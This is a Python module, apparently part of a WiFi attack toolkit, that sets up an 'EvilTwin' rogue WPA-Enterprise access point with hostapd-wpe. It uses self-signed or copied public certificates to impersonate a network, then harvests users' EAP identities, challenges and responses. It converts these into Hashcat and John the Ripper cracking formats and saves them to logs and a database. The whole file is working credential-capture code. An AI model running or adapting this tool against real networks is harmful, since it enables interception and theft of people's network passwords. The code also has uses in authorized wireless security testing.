# Module: eviltwin.py
# Description: Creates an rogue access point (EvilTwin).
# Author: Nick Sanzotta
# Contributors:
# Version: v 1.09282017
try:
	import os, sys, shutil, time, datetime, signal, threading
	from subprocess import Popen, PIPE
	from theme import *
	from dbcommands import DB
	import pubc
except Exception as e:
	print('\n [!] EVILTWIN - Error: ' % (e))
	sys.exit(1)

class evilTwin(threading.Thread):
	def __init__(self, db_path, interface, ssid, channel, macaddress, \
	 certname, public,  band, server_cert, private_key,\
	 country, state, city, company, ou, email, debug):
		threading.Thread.__init__(self)
		self.setDaemon(0) # non-daemon
		self.interface = interface
		self.wirelessInt = str(self.interface.get_ifname())
		self.macaddress = macaddress
		self.ssid = ssid
		self.channel = channel
		self.certname = certname
		self.public = public
		self.band = band
		self.country = country
		self.state = state
		self.city = city
		self.company = company
		self.ou = ou
		self.email = email
		self.server_cert = server_cert
		self.private_key = private_key
		self.debug = debug
		self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
		self.hashcat_log = 'data/eviltwin/%s_%s.hashcat' % (self.ssid, self.log_timestamp)
		self.jtr_log = 'data/eviltwin/%s_%s.jtr' % (self.ssid, self.log_timestamp)
		self.letsencrypt_dir = '/etc/letsencrypt/live/'
		self.db_path = db_path

	def run(self):
		self.database_connect() # Connect to database
		self.datafolders_check()
		self.cert_clean_up()
		
		# Use Self Signed Cert via OpenSSL
		if not self.public:
			self.sslCert(self.country, self.state, self.city, self.company, self.ou, self.certname, self.email)
		# Use Public Cert
		else:
			# Determines if requested Public Cert alreadly exists on system
			self.certname = self.certname.lower() # Cert Directory is lower case

			if os.path.exists('%s%s/privkey.pem' % (self.letsencrypt_dir, self.certname)) and \
			os.path.exists('%s%s/fullchain.pem' % (self.letsencrypt_dir, self.certname)):
				print(blue('*')+'Using Pre-existing Public Cert: %s%s\n' % (self.letsencrypt_dir, self.certname))
				self.cert_copy()
			# Generate new Public cert
			else:
				publicCert = pubc.crtb(self.certname, self.email, self.debug)
				publicCert.start()
				publicCert.join()
				time.sleep(1.5)
				self.cert_copy()

		
		print('\n')

		self.dependency_check()
		self.hostapd_config()
		self.sanity_check()
		time.sleep(1.5)

		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
		if not self.debug:
			print('\n [i] Real-time logging below:(Press Ctrl-C to quit)\n')
		else:
			print('\n'+white('Debug')+'Debug Mode enabled, credentials will not be saved to the database')
			print(white('Debug')+'Hostapd-wpe real-time logging below:(Press Ctrl-C to quit)\n')
		for line in iter(p1.stdout.readline, ''):
			if not self.debug:
				if "username" in line:
					user = line.split()[1]
				elif 'challenge' in line: 
					challenge = line.split()[1]
				elif 'response' in line:
					response = line.split()[1]
				elif 'jtr' in line:
					jtr = line.split()[2]
					hashcat = '%s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':'))
					print(green('*')+'Identity: %s' % (user))
					print(green('*')+'Hashcat: %s' % (hashcat))
					print(green('*')+'John: %s\n' % (jtr.rjust(5)))
					with open(self.hashcat_log, 'a') as f1:
						f1.write(hashcat)
						f1.write('\n')
					with open(self.jtr_log, 'a') as f2:
						f2.write(jtr)
						f2.write('\n')
					# Commit to database
					try:
						self.db.eviltwin_commit(self.ssid, user, hashcat)
					except Exception as e:
						print(red('!')+'WARNING - (EAPCONNECT) Could not save to database: %s' % (e))

			else:
				sys.stdout.write(line)

		# Obtain hostapd-wpe Process ID
		global eviltwin_pid
		eviltwin_pid=p1.pid
		raw_input('\n'+red('!') + 'Terminated: <Press Enter>\n')
		# Send the signal terminate HTTPS Serverprocess
		os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
	
	def dependency_check(self):
		'''Checks if hostapd-wpe is installed, if not installs it'''
		p1 = Popen(['which', 'hostapd-wpe'], stdout=PIPE)
		if p1.communicate()[0]:
			p2 = Popen(["dpkg-query", "-W", "-f", "${version}", "hostapd-wpe"], stdout=PIPE)
			if self.debug:
				print(white('Debug')+'Running hostapd-wpe %s' % (p2.communicate()[0]))
		else:
			print(blue('i')+'Installing hostapd-wpe ...')
			p3 = Popen(['apt-get install -y hostapd-wpe'], shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
			p3.wait()
			print(' [*] Installation completed')
			os.system('which hostapd-wpe')
			os.system('hostapd-wpe -v')
			print('\n')
			# print(p2.communicate())
	
	def datafolders_check(self):
		# Creates Cert and or Hostapd folder(s) if missing
		cert_directory = 'data/certs'
		hostapd_directory = 'data/hostapd-wpe'
		eviltwin_directory = 'data/eviltwin'

		if not os.path.exists(cert_directory):
			os.makedirs(cert_directory)
		if not os.path.exists(hostapd_directory):
			os.makedirs(hostapd_directory)
		if not os.path.exists(eviltwin_directory):
			os.makedirs(eviltwin_directory)

	def cert_clean_up(self):
		server_cert = 'data/certs/server_cert.pem'
		try:
		    os.remove(server_cert)
		except OSError:
		    pass

		private_key = 'data/certs/private_key.pem'
		try:
		    os.remove(private_key)
		except OSError:
		    pass

	def sanity_check(self):
		# Terminates conflicting processes
		p1 = Popen(['airmon-ng','check','kill'], stdout=PIPE)

	def fix_broken_package(self):
		# Fixes broken hostapd-wpe packages
		os.system('apt-get purge hostapd-wpe')
		os.system('apt-get update')
		os.system('apt-get install hostapd-wpe')
		#/var/run/hostapd-wpe/wlan0

	def hostapd_config(self):
		#Creates hostadp-wpe config file based of parameter values
		# Open original hostapd-wpe configuration file.
		with open('/etc/hostapd-wpe/hostapd-wpe.conf', 'r') as f1:
		    # Read a List of lines into data
		    data = f1.readlines()
		# Lines to modify in hostapd-wpe config file
		data[3] = 'interface=%s\n' % (self.wirelessInt)
		data[1] = 'driver=nl80211\n'
		data[14]= 'ssid=%s\n' % (self.ssid)
		data[15]= 'channel=%s\n' % (self.channel)
		data[8] = 'server_cert=%s\n' % (self.server_cert)
		data[9] = 'private_key=%s\n' % (self.private_key)
		data[19] = 'wpe_logfile=data/eviltwin/%s_%s.log\n' % (self.ssid, self.log_timestamp)
		data[183] = 'hw_mode=%s\n' % (self.band.lower())
		data[146] = 'country_code=US\n'
		
		country_code = data[146].lstrip('country_code=').rstrip('\n')

		print(blue('*')+'EvilTwin Details:')
		print('     AP Interface: %s' % (self.wirelessInt))
		print('     SSID: %s' % (self.ssid))
		print('     Band: %s' % (self.band))
		print('     Country Code: %s' % (country_code))
		print('     Channel: %s' % (self.channel))
		print('     Certificate Name: %s' % (self.certname))
		print('     Hashcat Log: %s' % (self.hashcat_log))
		print('     Jtr Log: %s' % (self.jtr_log))
		print('     Hostapd Log: data/eviltwin/%s_%s.log' % (self.ssid, self.log_timestamp))
		# print('     Server Cert Path: %s' % (self.server_cert))
		# print('     Private Key Path: %s' % (self.private_key))
		# Design Reference: 
		# Line4: # interface=wlan0
		# Line7: # eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
		# Line8: # ca_cert=/etc/hostapd-wpe/certs/ca.pem
		# Line9: # server_cert=/etc/hostapd-wpe/certs/server.pem
		# Line10:# private_key=/etc/hostapd-wpe/certs/server.key
		# Line11:# private_key_passwd=whatever
		# Line12:# dh_file=/etc/hostapd-wpe/certs/dh
		# Line15:# ssid=hostapd-wpe
		# Line16:# channel=1
		# Line20:# wpe_logfile=somefile              # (Default: ./hostapd-wpe.log)
		# Line184:# hw_mode=g
		
		# Save new hostapd-wpe config file in WiFiSuite's data/hostapd-wpe directory
		with open('data/hostapd-wpe/hostapd-wpe.conf', 'w') as f1:
		    f1.writelines( data )

	def cert_copy(self):
		# Copy over pre-existing Private Key to WiFiSuite's data/cert directory
		private_key_src = '%s%s/privkey.pem' % (self.letsencrypt_dir, self.certname)
		private_key_dst = 'data/certs/private_key.pem'
		try:
			shutil.copy(private_key_src, private_key_dst)
		except Exception as e:
			print(red('!')+'Error copying cert: "%s" \n %s' % (private_key_src, e))
		
		# Copy over pre-existing Server Cert to WiFiSuite's data/cert directory
		full_chain_src = '%s%s/fullchain.pem' % (self.letsencrypt_dir, self.certname)
		full_chain_dst = 'data/certs/server_cert.pem'
		try:
			shutil.copy(full_chain_src, full_chain_dst)
		except Exception as e:
			print(red('!')+'Error copying cert: "%s" \n %s' % (full_chain_src, e))

	def sslCert(self, country, state, city, company, orgUnit, fqdn, email):
		'''Create SSL Cert with Specified Values '''
		cert = """openssl \
		req \
		-nodes \
	    -x509\
	    -newkey rsa:2048 \
	    -keyout data/certs/private_key.pem \
	    -out data/certs/server_cert.pem \
	    -days 365\
	    -subj "/C={0}/ST={1}/L={2}/O={3}/OU={4}/CN={5}/emailAddress={6}"
		"""
		createCert = cert.format(country, state, city, company, orgUnit, fqdn, email)
		p1 = Popen([createCert],shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
		p1.wait()

	def database_connect(self):
		try:
			self.db = DB(self.db_path)
		except Exception as e:
			print(red('!')+'WARNING - (EvilTwin) Could not connect to database: %s' % (e))
			pass